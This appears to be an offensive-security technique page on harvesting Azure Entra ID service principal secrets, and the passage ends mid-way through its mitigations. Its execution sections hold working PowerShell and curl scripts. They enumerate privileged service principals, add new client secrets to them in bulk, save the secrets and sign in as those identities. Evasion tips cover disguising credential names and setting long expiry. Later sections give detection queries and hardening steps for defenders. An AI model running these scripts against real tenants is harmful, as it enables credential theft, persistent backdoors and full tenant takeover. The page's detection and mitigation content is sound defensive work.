# [CA-UNSC-010]: Service principal secrets harvesting

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-010 |
| **MITRE ATT&CK v18.1** | [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID (Azure Cloud) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | All Azure AD/Entra ID deployments, PowerShell 5.0+, Azure CLI 2.0+ |
| **Patched In** | N/A - Design behavior, Microsoft strongly recommends Managed Identities and RBAC least privilege |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 5 (Atomic Red Team), 10 (Sysmon Detection), and 13 (Microsoft Defender for Cloud specific alerts) not included because: (1) No specific Atomic test exists for service principal credential harvesting (T1552.004 tests focus on local credentials), (2) Sysmon does not monitor cloud activity, (3) MDC alerts are covered in detection section via Sentinel. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Service principals in Entra ID (Azure AD) are application identities used for authentication and authorization in Azure/Microsoft 365 environments. Each service principal can have multiple authentication credentials: **client secrets** (passwords) and **certificate-based credentials**. An attacker with insufficient permissions (e.g., Application Administrator role, application ownership, or a compromised service principal with sufficient permissions) can harvest, create, or reset service principal credentials. The extracted credentials grant immediate access to all Azure resources and Microsoft 365 services that the compromised service principal is assigned to. Unlike human accounts, service principal credential theft often bypasses MFA and Conditional Access policies, making them a high-value target. Service principals frequently hold privileged roles (e.g., Global Administrator, Privileged Role Administrator, Exchange Administrator), so compromising one enables enterprise-wide lateral movement and persistence.

**Attack Surface:** Entra ID data plane (Azure Graph API endpoints: `/applications/{app-id}/credentials`, `/servicePrincipals/{sp-id}/credentials`), RBAC role assignments (particularly Application Administrator, Cloud Application Administrator, Company Administrator), application ownership relationships.

**Business Impact:** **Complete tenant compromise and irreversible lateral movement.** A stolen service principal credential with a high-privilege role (e.g., Privileged Role Administrator assigned to a service principal) enables an attacker to add themselves as Global Administrator and establish persistent backdoor access. Service principals often run unattended automation (CI/CD pipelines, backup jobs, scheduled tasks), so compromise can go undetected for extended periods. Unlike user account compromises which may trigger MFA or anomalous sign-in alerts, service principal compromises are often silent.

**Technical Context:** Credential harvesting is **immediate** (seconds) once permissions are obtained. Detection likelihood is **Medium** if audit logging is enabled and monitored. Many organizations fail to audit service principal credential changes. The attack is **reversible** only if discovered before the stolen credentials are used; once used, sensitive data may already be exfiltrated.

### Operational Risk

- **Execution Risk:** Low-to-Medium - Requires existing compromised account with Application Administrator role or application ownership. No complex exploitation required; straightforward API/PowerShell calls.
- **Stealth:** Low - Credential creation/reset operations are logged in audit logs. However, many organizations do not actively monitor service principal credential changes.
- **Reversibility:** Partial - Compromised credentials can be revoked, but if attacker has already used them to export data or establish persistence, damage is done.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.2 | Service principal owners must be regularly reviewed; service principals should not have Global Administrator role |
| **CIS Benchmark** | 1.3.1 | Unused service principals must be removed |
| **DISA STIG** | IA-4 | Service principal authentication must be properly controlled |
| **NIST 800-53** | IA-2 | Authentication - Service principal credentials must be protected |
| **NIST 800-53** | AC-3 | Access Enforcement - Service principals should have least privilege |
| **NIST 800-53** | AC-6 | Least Privilege - Service principals granted only necessary roles |
| **GDPR** | Art. 32 | Security of Processing - Protection of authentication credentials |
| **DORA** | Art. 9 | Protection and Prevention - Safeguarding of ICT authentication credentials |
| **NIS2** | Art. 21 | Cyber Risk Management - Credential management and protection |
| **ISO 27001** | A.9.1 | User Registration and De-registration - Service principals must be managed |
| **ISO 27001** | A.9.4.2 | Password Management - Service principal credential management policies |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Minimum: Owner of a service principal (can add credentials to owned service principal)
- Or: Application Administrator role (can reset ANY application/service principal credentials at tenant level)
- Or: Cloud Application Administrator role (similar permissions to Application Administrator)
- Or: Global Administrator role (can perform any service principal operation)
- Or: Existing compromised service principal with sufficient RBAC permissions to enumerate other service principals

**Required Access:**
- Network access to Azure portal, Azure CLI, or PowerShell remoting
- Authentication token from a compromised account with one of the above roles/permissions
- OAuth scope: `Application.ReadWrite.All` and/or `Directory.ReadWrite.All` (if using Microsoft Graph)

**Supported Versions:**
- **Azure AD / Entra ID:** All versions (cloud-native, no versioning)
- **PowerShell modules:** Az.Resources (v4.0+), Az.Identity (v1.0+), AzureAD (deprecated but still functional)
- **Azure CLI:** 2.0+ (tested up to 2.60+)
- **Microsoft Graph PowerShell SDK:** 1.0+ (recommended over AzureAD module)
- **Affected Platforms:** Windows Server 2016+, Linux, macOS

**Tools:**
- [Azure PowerShell (Az.Resources)](https://learn.microsoft.com/en-us/powershell/module/az.resources/) (v4.0+)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation) (v1.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.0+)
- [Microsoft Entra built-in roles reference](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Command 1: Identify your role and check if ApplicationAdministrator**

```powershell
# Get current user context
$context = Get-AzContext
Write-Host "Current Account: $($context.Account.Id)"

# Check if current user is ApplicationAdministrator
Connect-MgGraph -Scopes "DirectoryRole.Read.All"
$appAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Application Administrator'"

if ($appAdminRole) {
    $members = Get-MgDirectoryRoleMember -DirectoryRoleId $appAdminRole.Id | Where-Object { $_.AdditionalProperties.userPrincipalName -eq $context.Account.Id }
    if ($members) {
        Write-Host "[✓] User IS an Application Administrator (can reset any SP credentials)"
    } else {
        Write-Host "[✗] User is NOT an Application Administrator"
    }
} else {
    Write-Host "[✗] Application Administrator role not found"
}
```

**What to Look For:**
- If the output shows `[✓]`, you have Application Administrator privileges and can reset any service principal password
- If `[✗]`, check if you own any applications (see Command 2)

**Command 2: List applications you own**

```powershell
# Get applications where the current user is an owner
$ownedApps = Get-MgApplication -Filter "owners/any(x:x/id eq '$($context.Account.ObjectId)')"

Write-Host "[*] Applications owned by current user: $($ownedApps.Count)"
foreach ($app in $ownedApps) {
    Write-Host "  - App Name: $($app.DisplayName)"
    Write-Host "    AppId: $($app.AppId)"
    Write-Host "    ObjectId: $($app.Id)"
    
    # Check if this app has a service principal
    $sp = Get-MgServicePrincipal -Filter "appId eq '$($app.AppId)'"
    if ($sp) {
        Write-Host "    Service Principal: $($sp.DisplayName) (ObjectId: $($sp.Id))"
        
        # List current credentials
        $credentials = Get-MgServicePrincipalCredential -ServicePrincipalId $sp.Id
        Write-Host "    Current Credentials: $($credentials.Count)"
    }
}
```

**What to Look For:**
- If you own any applications, you can add credentials to their service principals
- If multiple applications are owned, prioritize those with high-privilege roles

**Command 3: Enumerate all service principals in the tenant**

```powershell
# List all service principals (requires Directory.Read.All permission)
$allSPs = Get-MgServicePrincipal -All

Write-Host "[*] Total service principals in tenant: $($allSPs.Count)"

# Identify high-privilege service principals
$highPrivilegeRoles = @("Global Administrator", "Privileged Role Administrator", "Exchange Administrator", "SharePoint Administrator")

foreach ($sp in $allSPs) {
    # Get roles assigned to this service principal
    $spRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -All
    
    foreach ($role in $spRoles) {
        if ($role.AppRoleId -in $highPrivilegeRoles) {
            Write-Host "[!] HIGH-PRIVILEGE SP FOUND:"
            Write-Host "    Name: $($sp.DisplayName)"
            Write-Host "    ObjectId: $($sp.Id)"
            Write-Host "    Role: $($role.AppRoleId)"
        }
    }
}
```

**What to Look For:**
- Service principals with high-privilege roles (Global Admin, PRA, etc.) are high-value targets
- Service principals running Azure automation, CI/CD pipelines, or backup jobs are likely to have broad permissions

**Command 4: Check a specific service principal's credentials**

```powershell
$spName = "MyHighPrivilegeSP"
$sp = Get-MgServicePrincipal -Filter "displayName eq '$spName'"

if ($sp) {
    Write-Host "Service Principal: $($sp.DisplayName)"
    Write-Host "ObjectId: $($sp.Id)"
    Write-Host "AppId: $($sp.AppId)"
    
    # Get all credentials (password + certificate)
    $credentials = Get-MgServicePrincipalCredential -ServicePrincipalId $sp.Id
    
    Write-Host "`nCredentials on file:"
    foreach ($cred in $credentials) {
        Write-Host "  - Type: $($cred.Type)"
        Write-Host "    DisplayName: $($cred.DisplayName)"
        Write-Host "    KeyId: $($cred.KeyId)"
        Write-Host "    EndDate: $($cred.EndDateTime)"
        Write-Host "    Created: $($cred.StartDateTime)"
        # Note: Credential VALUE is NOT returned (secret is hidden)
    }
}
```

**What to Look For:**
- Number of credentials on the service principal (multiple credentials = multiple backdoors)
- Credential end dates (old credentials not cleaned up = potential for credential rotation attacks)
- Type of credentials (passwords vs certificates)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Create new credential on service principal you own

**Supported Versions:** All Azure AD/Entra ID versions

#### Step 1: Authenticate to Entra ID with your user account

**Objective:** Establish authentication context as your user account which owns the target application/service principal.

**Command (PowerShell):**

```powershell
# Connect using user credentials
Connect-MgGraph -Scopes "Application.ReadWrite.All", "ServicePrincipal.ReadWrite.All", "Directory.Read.All"

# Verify connection
$context = Get-MgContext
Write-Host "Connected as: $($context.Account.Id)"
```

**Expected Output:**

```
Connected as: user@contoso.com
```

**OpSec & Evasion:**
- Use `-Environment` parameter to connect to different Azure clouds if available
- Authenticate from a proxy/jump host to obfuscate source IP

---

#### Step 2: Identify target service principal

**Objective:** Find the service principal for the application you own or have elevated permissions over.

**Command:**

```powershell
# If you own an application
$appName = "MyApplication"
$app = Get-MgApplication -Filter "displayName eq '$appName'"

if (-not $app) {
    Write-Host "[✗] Application not found"
    exit
}

Write-Host "[✓] Found application: $($app.DisplayName)"
Write-Host "    AppId: $($app.AppId)"
Write-Host "    ObjectId: $($app.Id)"

# Get the associated service principal
$sp = Get-MgServicePrincipal -Filter "appId eq '$($app.AppId)'"

if (-not $sp) {
    Write-Host "[✗] Service Principal not found (may not have been created yet)"
    exit
}

Write-Host "[✓] Found service principal: $($sp.DisplayName)"
Write-Host "    ServicePrincipalId: $($sp.Id)"
Write-Host "    AppId: $($sp.AppId)"
```

**Expected Output:**

```
[✓] Found application: MyApplication
    AppId: 12345678-1234-1234-1234-123456789012
    ObjectId: 87654321-4321-4321-4321-210987654321

[✓] Found service principal: MyApplication
    ServicePrincipalId: 11111111-2222-3333-4444-555555555555
    AppId: 12345678-1234-1234-1234-123456789012
```

**What This Means:**
- Application Object ID != Service Principal Object ID (they are different security objects)
- You now have the Service Principal ID needed to add credentials

---

#### Step 3: Create new password credential on service principal

**Objective:** Add a new client secret (password) to the service principal for authentication.

**Command:**

```powershell
$spId = "11111111-2222-3333-4444-555555555555"  # Service principal ID from Step 2

# Create a new password credential valid for 2 years
$credentialExpiration = (Get-Date).AddYears(2)

# Create password credential using Microsoft Graph
$passwordCred = @{
    displayName = "New Client Secret for Persistence"
    endDateTime = $credentialExpiration
}

$newCredential = Add-MgServicePrincipalPassword -ServicePrincipalId $spId -PasswordCredential $passwordCred

Write-Host "[✓] New credential created successfully!"
Write-Host "    KeyId: $($newCredential.KeyId)"
Write-Host "    DisplayName: $($newCredential.DisplayName)"
Write-Host "    Expires: $($newCredential.EndDateTime)"
Write-Host ""
Write-Host "[!] CREDENTIAL VALUE (SAVE THIS IMMEDIATELY - shown only once):"
Write-Host "    Secret: $($newCredential.SecretText)"
Write-Host ""
Write-Host "Save this to use later for authentication!"

# Store credential for later use
$storedCred = @{
    AppId = (Get-MgServicePrincipal -ServicePrincipalId $spId).AppId
    TenantId = (Get-MgContext).TenantId
    ClientSecret = $newCredential.SecretText
    KeyId = $newCredential.KeyId
}

$storedCred | ConvertTo-Json | Out-File "$env:TEMP\sp_credential.json" -Force
Write-Host "[✓] Credential saved to: $env:TEMP\sp_credential.json"
```

**Expected Output:**

```
[✓] New credential created successfully!
    KeyId: aBcD1234eFgH5678iJkL9012
    DisplayName: New Client Secret for Persistence
    Expires: 01/06/2028 11:15:00 AM

[!] CREDENTIAL VALUE (SAVE THIS IMMEDIATELY - shown only once):
    Secret: MySecretValueHere1234567890abcdefghijklmnopqrstuvwxyz1234567890

Save this to use later for authentication!
[✓] Credential saved to: C:\Users\attacker\AppData\Local\Temp\sp_credential.json
```

**What This Means:**
- You have successfully created a new service principal credential
- The secret value is shown **only once**—if you don't save it, it cannot be recovered
- The KeyId is a permanent reference to this credential

**OpSec & Evasion:**
- Use a generic display name (e.g., "Client Secret" instead of "Backdoor Access")
- Set a far-future expiration date (2+ years) to maintain persistence
- Store the credential in memory only; avoid writing to disk if possible
- Use `$env:TEMP` which gets cleaned on system restart (better than permanent locations)

**Troubleshooting:**

- **Error:** "Insufficient privileges to complete the operation"
  - **Cause:** You don't own the application or don't have ApplicationAdministrator role
  - **Fix:** Verify you are listed as owner in app properties

- **Error:** "The request is not supported"
  - **Cause:** Using deprecated AzureAD module; use Microsoft Graph instead
  - **Fix:** Use `Add-MgServicePrincipalPassword` instead of `New-AzureADApplicationPasswordCredential`

---

#### Step 4: Use stolen credential to authenticate as the service principal

**Objective:** Verify the credential works and establish access to Azure resources assigned to the service principal.

**Command:**

```powershell
# Load the stored credential
$storedCred = Get-Content "$env:TEMP\sp_credential.json" | ConvertFrom-Json

$appId = $storedCred.AppId
$tenantId = $storedCred.TenantId
$clientSecret = $storedCred.ClientSecret

Write-Host "[*] Authenticating as service principal..."

# Create PSCredential object
$secureSecret = ConvertTo-SecureString $clientSecret -AsPlainText -Force
$spCredential = New-Object System.Management.Automation.PSCredential($appId, $secureSecret)

# Disconnect existing connection
Disconnect-MgGraph -ErrorAction SilentlyContinue

# Connect as service principal
try {
    Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $spCredential -NoWelcome
    Write-Host "[✓] Successfully authenticated as service principal!"
    
    # Verify access by getting current user info
    $me = Get-MgContext
    Write-Host "    Context Account: $($me.Account)"
    Write-Host "    Tenant: $($me.TenantId)"
    
} catch {
    Write-Host "[✗] Failed to authenticate: $($_.Exception.Message)"
    exit
}

# Now you can access Azure resources as this service principal
# List subscriptions accessible to this service principal
Write-Host "`n[*] Subscriptions accessible to service principal:"

Connect-AzAccount -ServicePrincipal -Credential $spCredential -Tenant $tenantId
$subscriptions = Get-AzSubscription
foreach ($sub in $subscriptions) {
    Write-Host "  - $($sub.Name) (ID: $($sub.Id))"
}
```

**Expected Output:**

```
[*] Authenticating as service principal...
[✓] Successfully authenticated as service principal!
    Context Account: 12345678-1234-1234-1234-123456789012
    Tenant: abcdefgh-1234-5678-9012-abcdefghijkl

[*] Subscriptions accessible to service principal:
  - Production (ID: sub-12345)
  - Development (ID: sub-67890)
```

**What This Means:**
- Service principal credential is valid and functional
- Service principal has access to all subscriptions/resources listed
- You can now perform any operations this service principal is permitted to do

---

### METHOD 2: Escalate via Application Administrator role

**Supported Versions:** All Azure AD/Entra ID versions, requires Application Administrator role

#### Escalation Flow

**Scenario:** You have compromised a user account with Application Administrator role. You want to harvest credentials from a high-privilege service principal that you do NOT own.

#### Step 1: Authenticate as Application Administrator user

```powershell
# Connect with ApplicationAdministrator account
$adminCreds = Get-Credential  # Provide the ApplicationAdministrator account credentials
Connect-MgGraph -Credential $adminCreds -Scopes "Application.ReadWrite.All", "ServicePrincipal.ReadWrite.All"

$context = Get-MgContext
Write-Host "Connected as: $($context.Account.Id)"
```

---

#### Step 2: Find target service principal with high privileges

```powershell
# Enumerate all service principals and identify high-privilege ones
$allSPs = Get-MgServicePrincipal -All

Write-Host "[*] Searching for high-privilege service principals..."

foreach ($sp in $allSPs) {
    # Check if this SP has directory roles (admin roles)
    $roles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -All
    
    if ($roles) {
        Write-Host "`n[!] Service Principal with roles found:"
        Write-Host "    Name: $($sp.DisplayName)"
        Write-Host "    ObjectId: $($sp.Id)"
        Write-Host "    AppId: $($sp.AppId)"
        Write-Host "    Roles assigned:"
        foreach ($role in $roles) {
            Write-Host "      - $($role.AppRoleId)"
        }
    }
}

# Select target SP (example: service principal with Privileged Role Administrator role)
$targetSpName = "PrivilegedServicePrincipal"  # Change to your target
$targetSp = Get-MgServicePrincipal -Filter "displayName eq '$targetSpName'"

if (-not $targetSp) {
    Write-Host "[✗] Target service principal not found"
    exit
}

Write-Host "`n[✓] Target selected: $($targetSp.DisplayName) (ObjectId: $($targetSp.Id))"
```

---

#### Step 3: Create new password credential as Application Administrator

**Key Point:** Application Administrator role can reset ANY service principal's credentials, even if you don't own the application.

```powershell
$targetSpId = $targetSp.Id

# Create new password credential
$credentialExpiration = (Get-Date).AddYears(2)

$passwordCred = @{
    displayName = "Maintenance Access"  # Use innocent-sounding name
    endDateTime = $credentialExpiration
}

$newCredential = Add-MgServicePrincipalPassword -ServicePrincipalId $targetSpId -PasswordCredential $passwordCred

Write-Host "[✓] Credential created on target service principal!"
Write-Host "    Service Principal: $($targetSp.DisplayName)"
Write-Host "    AppId: $($targetSp.AppId)"
Write-Host "    Client Secret: $($newCredential.SecretText)"

# Save for later use
$exfilData = @{
    Target = $targetSp.DisplayName
    AppId = $targetSp.AppId
    ClientSecret = $newCredential.SecretText
    TenantId = (Get-MgContext).TenantId
} | ConvertTo-Json

$exfilData | Out-File "C:\temp\harvested_credentials.json"
Write-Host "[✓] Credentials saved to: C:\temp\harvested_credentials.json"
```

**OpSec & Evasion:**
- Application Administrator role changes are logged, but may not trigger alerts if unmonitored
- Create credentials with innocent-sounding names
- Set far-future expiration dates
- After harvesting, consider removing the new credential to reduce detection surface (but keep backup copy)

---

### METHOD 3: Bulk enumeration and extraction (high-speed, noisy)

**Warning:** This operation generates many audit logs and is **highly detectable**.

**Command:**

```powershell
# Connect with elevated privileges
Connect-MgGraph -Scopes "Application.ReadWrite.All", "ServicePrincipal.ReadWrite.All", "Directory.Read.All"

$outputDir = "C:\extracted_sp_creds"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

# Get all applications
$allApps = Get-MgApplication -All
Write-Host "[*] Found $($allApps.Count) applications"

$harvestedCount = 0

foreach ($app in $allApps) {
    try {
        # Get service principal for this app
        $sp = Get-MgServicePrincipal -Filter "appId eq '$($app.AppId)'" -ErrorAction SilentlyContinue
        
        if ($sp -and $sp.Id) {
            # Check if you own this app or are ApplicationAdministrator
            $canCreate = $false
            
            # Method 1: Check if you own the app
            $owners = Get-MgApplicationOwner -ApplicationId $app.Id -All -ErrorAction SilentlyContinue
            $currentUser = (Get-MgContext).Account.Id
            if ($owners | Where-Object { $_.Id -eq $currentUser }) {
                $canCreate = $true
                Write-Host "[✓] Own: $($app.DisplayName)"
            } elseif ($canCreate) {
                # Method 2: If ApplicationAdministrator, can always create
                Write-Host "[+] Create cred (ApplicationAdmin): $($app.DisplayName)"
            }
            
            if ($canCreate) {
                # Create new password credential
                $newCred = Add-MgServicePrincipalPassword -ServicePrincipalId $sp.Id -PasswordCredential @{
                    displayName = "Auto Generated Access"
                    endDateTime = (Get-Date).AddYears(5)
                }
                
                $credData = @{
                    AppName = $app.DisplayName
                    AppId = $app.AppId
                    ServicePrincipalId = $sp.Id
                    ClientSecret = $newCred.SecretText
                    Created = Get-Date
                } | ConvertTo-Json
                
                $credData | Out-File "$outputDir\$($app.DisplayName)_cred.json"
                $harvestedCount++
            }
        }
    } catch {
        # Silently continue on errors (permission denied, etc.)
    }
}

Write-Host "`n[✓] Extraction complete. $harvestedCount credentials harvested."
Write-Host "[✓] Credentials saved to: $outputDir"
```

---

### METHOD 4: REST API direct approach (cross-platform)

**Command (Bash with curl):**

```bash
#!/bin/bash

TENANT_ID="your-tenant-id"
CLIENT_ID="your-client-id"
CLIENT_SECRET="your-client-secret"

# Get access token
TOKEN_RESPONSE=$(curl -s -X POST \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${CLIENT_ID}&scope=https://graph.microsoft.com/.default&client_secret=${CLIENT_SECRET}&grant_type=client_credentials")

ACCESS_TOKEN=$(echo $TOKEN_RESPONSE | jq -r '.access_token')

# List all service principals
echo "[*] Listing service principals..."
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?$top=999" \
  | jq '.value[] | {displayName, id, appId}'

# Get a specific service principal
SP_ID="your-sp-object-id"
echo "[*] Getting service principal credentials for $SP_ID..."
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_ID}" \
  | jq '.'

# Add password credential
echo "[*] Adding password credential..."
curl -s -X POST -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_ID}/addPassword" \
  -d '{"passwordCredential":{"displayName":"New Access","endDateTime":"2027-01-06T00:00:00Z"}}' \
  | jq '.secretText'
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network IOCs:**
- Destination: `https://graph.microsoft.com:443`, `https://login.microsoftonline.com:443`
- HTTP Method: POST (for creating credentials)
- URI patterns: `/servicePrincipals/{id}/addPassword`, `/applications/{id}/addPassword`, `/servicePrincipals/{id}/credential`
- User-Agent: `Azure-CLI`, `Azure-PowerShell`, `curl`, Microsoft Graph SDK

**Audit Log IOCs:**
- **Operation:** "Add service principal key", "Add service principal password credential", "Add service principal certificate credential", "Update service principal"
- **Result Type:** Success
- **Resource:** Service Principal name or Application ID
- **Initiator:** User with Application Administrator or application owner role
- **Abnormal patterns:** Credential creation outside business hours, bulk credential creation (3+ in <1 hour), credentials with far-future expiration (5+ years), innocent-sounding display names ("Maintenance", "Backup", "Sync", "Migration")

**Forensic Artifacts:**
- Azure Audit Logs (AuditLogs table): OperationName = "Add service principal password credential"
- Microsoft 365 Unified Audit Log: Operations = "Add service principal", "Update service principal credentials"
- Service Principal sign-in logs: Unusual sign-ins from new service principals or unusual IPs

---

### Microsoft Sentinel Detection Queries

#### Rule 1: Detect credential creation on high-privilege service principals

**KQL Query:**

```kusto
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName in ("Add service principal password credential", "Add service principal key", "Update service principal")
| where Result == "Success"
| extend TargetSpId = tostring(TargetResources[0].id)
| extend TargetSpName = tostring(TargetResources[0].displayName)
| extend InitiatedBy_User = tostring(InitiatedBy.user.userPrincipalName)
| where TargetSpName has_any ("admin", "privileged", "global", "pra", "exchange")  // Target likely high-privilege SPs
| project TimeGenerated, OperationName, InitiatedBy_User, TargetSpName, TargetSpId, Result
```

**What This Detects:**
- Creation of new credentials on service principals with "admin" in their names
- Identifies both the attacker (InitiatedBy_User) and compromised service principal (TargetSpName)

---

#### Rule 2: Detect ApplicationAdministrator credential reset on unowned applications

**KQL Query:**

```kusto
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName == "Add service principal password credential"
| where Result == "Success"
| extend InitiatedBy_User = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetAppId = tostring(TargetResources[0].displayName)
| extend TargetAppObjectId = tostring(TargetResources[0].id)
// Check if the user initiating is an Application Administrator
| join kind=inner (
    AuditLogs
    | where OperationName == "Add member to role"
    | where TargetResources[0].displayName == "Application Administrator"
    | extend AdminUser = tostring(InitiatedBy.user.userPrincipalName)
    | project AdminUser
) on $left.InitiatedBy_User == $right.AdminUser
// Exclude if user is the owner of the application (would require separate audit check)
| project TimeGenerated, InitiatedBy_User, TargetAppId, TargetAppObjectId
| where InitiatedBy_User != ""  // Only human users, not service principals
```

**What This Detects:**
- Credential creation by ApplicationAdministrator role on applications that user doesn't own
- Indicates potential privilege escalation path for attacker

---

#### Rule 3: Detect bulk service principal credential creation

**KQL Query:**

```kusto
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName in ("Add service principal password credential", "Add service principal key")
| where Result == "Success"
| extend InitiatedBy_User = tostring(InitiatedBy.user.userPrincipalName)
| summarize CredentialCount = count(), DistinctTargets = dcount(TargetResources[0].displayName)
            by InitiatedBy_User, bin(TimeGenerated, 1h)
| where CredentialCount > 3  // Threshold: >3 credentials in 1 hour is suspicious
```

---

#### Rule 4: Detect unusual service principal sign-in activity

**KQL Query:**

```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| where ServicePrincipalName != ""  // Service principal sign-in
| where ResultType == 0  // Successful sign-in
| extend Location = Location.city
| summarize SigninCount = count(), DistinctLocations = dcount(Location), FirstSignin = min(TimeGenerated)
            by ServicePrincipalName
| where SigninCount > 100 or DistinctLocations > 2  // Suspicious: high frequency or multi-location
| order by SigninCount desc
```

---

### Azure Monitor / Log Analytics Hunting

```kusto
// Hunt for all service principal credential changes in past 30 days
AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName in ("Add service principal password credential", "Add service principal key", "Add service principal certificate credentials", "Remove service principal credentials")
| extend UserInitiated = tostring(InitiatedBy.user.userPrincipalName)
| extend ServicePrincipal = tostring(TargetResources[0].displayName)
| extend OperationDetails = tostring(TargetResources[0].modifiedProperties)
| project TimeGenerated, UserInitiated, OperationName, ServicePrincipal, Result
| summarize OperationCount = count() by ServicePrincipal, UserInitiated
| where OperationCount > 2  // Service principals with >2 credential changes
```

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Eliminate ApplicationAdministrator role assignments from human users**

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for and click **Application Administrator**
3. Click **Assignments**
4. Review all members
5. For each human user, click the **X** to remove them
6. (Optional) If they need this access, instead grant them **Application Developer** role (limited permissions)

**Manual Steps (PowerShell):**
```powershell
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

# Get Application Administrator role
$appAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Application Administrator'"

# Get all members
$members = Get-MgDirectoryRoleMember -DirectoryRoleId $appAdminRole.Id

Write-Host "Application Administrator members to review:"
foreach ($member in $members) {
    Write-Host "  - $($member.DisplayName) (Type: $($member.AdditionalProperties['@odata.type']))"
}

# Remove a specific user
$userToRemove = Get-MgUser -Filter "userPrincipalName eq 'user@contoso.com'"
Remove-MgDirectoryRoleMember -DirectoryRoleId $appAdminRole.Id -DirectoryObjectId $userToRemove.Id

Write-Host "[✓] User removed from Application Administrator role"
```

**Validation Command:**
```powershell
$appAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Application Administrator'"
$members = Get-MgDirectoryRoleMember -DirectoryRoleId $appAdminRole.Id
Write-Host "[*] Remaining Application Administrator members: $($members.Count)"
if ($members.Count -eq 0) {
    Write-Host "[✓] No human users with Application Administrator role"
}
```

---

**2. Use Managed Identities instead of service principals with credentials**

**Manual Steps (Azure Portal - example for Azure Function):**
1. Go to **Function App** → **Settings** → **Identity**
2. Under **System assigned**, toggle **Status** to **On**
3. Click **Save**
4. (Optional) Under **User assigned**, click **+ Add** to create custom managed identity
5. Now assign roles to this managed identity instead of creating credentials

**Manual Steps (PowerShell):**
```powershell
# Create a user-assigned managed identity
$resourceGroup = "MyResourceGroup"
$identityName = "MyManagedIdentity"

$identity = New-AzUserAssignedIdentity -ResourceGroupName $resourceGroup -Name $identityName

# Assign RBAC role to managed identity
$roleAssignmentScope = "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}"
New-AzRoleAssignment -ObjectId $identity.PrincipalId -RoleDefinitionName "Contributor" -Scope $roleAssignmentScope

Write-Host "[✓] Managed Identity created and assigned Contributor role"
```

**Benefits:**
- No credentials to steal (no secrets to compromise)
- Azure handles token refresh automatically
- Cannot be exported or accidentally committed to source control

---

**3. Enforce credential expiration policy on all service principals**

**Manual Steps (PowerShell - create Azure Policy):**
```powershell
# Create an Azure Policy to enforce credential expiration (max 2 years)
# Note: This is a custom policy; requires Policy definition creation

# For immediate effect, audit existing service principals with long-lived credentials:
Connect-MgGraph -Scopes "Application.ReadWrite.All", "ServicePrincipal.ReadWrite.All"

$allSPs = Get-MgServicePrincipal -All

Write-Host "[*] Auditing service principal credentials..."
foreach ($sp in $allSPs) {
    $credentials = Get-MgServicePrincipalCredential -ServicePrincipalId $sp.Id
    
    foreach ($cred in $credentials) {
        $expiresIn = ($cred.EndDateTime - (Get-Date)).Days
        
        if ($expiresIn -lt 0) {
            Write-Host "[!] EXPIRED: $($sp.DisplayName) - Credential expired $([Math]::Abs($expiresIn)) days ago"
        } elseif ($expiresIn -gt 730) {  # 2 years
            Write-Host "[!] LONG-LIVED: $($sp.DisplayName) - Credential expires in $expiresIn days (exceeds 2-year policy)"
        }
    }
}
```

---

#### Priority 2: HIGH

**4. Review and remove application ownership from inactive/high-risk users**

**Manual Steps:**
1. Go to **Entra ID** → **App registrations** → **All applications**
2. For each application, click **Owners**
3. Review the owners
4. Remove risky owners (terminated employees, inactive accounts, overly privileged users)

---

**5. Implement Conditional Access policy requiring MFA for ApplicationAdministrator role usage**

**Manual Steps (Azure Portal):**
1. Go **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. **Name:** `Require MFA for Application Administrator`
3. **Assignments:**
   - **Users:** Select **Directory roles** → Check **Application Administrator**
   - **Cloud apps:** Select **All cloud apps**
4. **Conditions:**
   - **Client apps:** **Browser**, **Mobile apps and desktop clients**
5. **Access controls:**
   - **Grant:** Check **Require multi-factor authentication**
6. **Enable policy:** **Report-only** (test first), then **On**

---

**6. Audit and disable credentials on service principals not actively used**

**Manual Steps:**
```powershell
# List all service principals with credentials but no sign-in activity in past 90 days
$cutoffDate = (Get-Date).AddDays(-90)
